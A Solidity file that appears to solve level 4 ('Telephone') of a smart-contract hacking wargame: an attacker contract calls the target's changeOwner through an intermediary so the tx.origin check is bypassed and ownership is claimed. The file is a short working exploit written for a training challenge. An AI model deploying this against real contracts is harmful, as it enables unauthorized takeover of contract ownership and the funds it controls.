// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 4. TELEPHONE
 * @dev Claim ownership of the contract below to complete this level.
 */

interface ITelephone {
    function changeOwner(address _owner) external;
}

// Simply use a contract to call the changeOwner function and bypass the tx.origin check
contract MissedCall {
    address immutable telephone;

    constructor(address _telephone) {
        telephone = _telephone;
    }

    function attack() public {
        ITelephone(telephone).changeOwner(msg.sender);
    }
}
